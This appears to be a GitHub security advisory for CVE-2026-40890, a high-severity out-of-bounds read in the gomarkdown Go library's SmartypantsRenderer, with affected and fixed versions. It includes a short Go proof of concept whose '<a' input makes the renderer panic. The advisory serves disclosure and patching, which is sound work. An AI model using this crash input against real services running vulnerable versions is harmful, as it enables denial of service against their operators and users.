# [H] Go Markdown has an Out-of-bounds Read in SmartypantsRenderer

## Summary
Severity: High
Advisory: GHSA-77fj-vx54-gvh7
CVE: CVE-2026-40890
CWE: CWE-125
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-77fj-vx54-gvh7
Type: github-advisory

## Affected
- Go: `github.com/gomarkdown/markdown` — affected >=0 <0.0.0-20260411013819-759bbc3e3207

## Details
### Summary

Processing a malformed input containing a `<` character that is not followed by a `>` character anywhere in the remaining text with a SmartypantsRenderer will lead to Out of Bounds read or a panic.

### Details

The `smartLeftAngle()` function in `html/smartypants.go:367-376` performs an out-of-bounds slice operation when processing a `<` character that is not followed by a `>` character anywhere in the remaining text.
https://github.com/gomarkdown/markdown/blob/37c66b85d6ab025ba67a73ba03b7f3ef55859cca/html/smartypants.go#L367-L376
If the length of the slice is lower than its capacity, this leads to an extra byte of data read. If the length equals the capacity, this leads to a panic.

### PoC
```golang
package main

import (
	"bytes"
	"fmt"

	"github.com/gomarkdown/markdown/html"
)

func main() {
	src := []byte("<a")

	fmt.Printf("Input: %q  (len=%d, cap=%d)\n", src, len(src), cap(src))

	var buf bytes.Buffer
	sp := html.NewSmartypantsRenderer(html.Smartypants)
	sp.Process(&buf, src) // panics: slice bounds out of range

	fmt.Printf("Output: %q\n", buf.String())
}
```

### Impact
This vulnerability will lead to a Denial of Service / panic on the processing service.


-- The Datadog Security Team

## References
- https://github.com/gomarkdown/markdown/security/advisories/GHSA-77fj-vx54-gvh7
- https://nvd.nist.gov/vuln/detail/CVE-2026-40890
- https://github.com/gomarkdown/markdown/commit/759bbc3e32073c3bc4e25969c132fc520eda2778
- https://github.com/gomarkdown/markdown
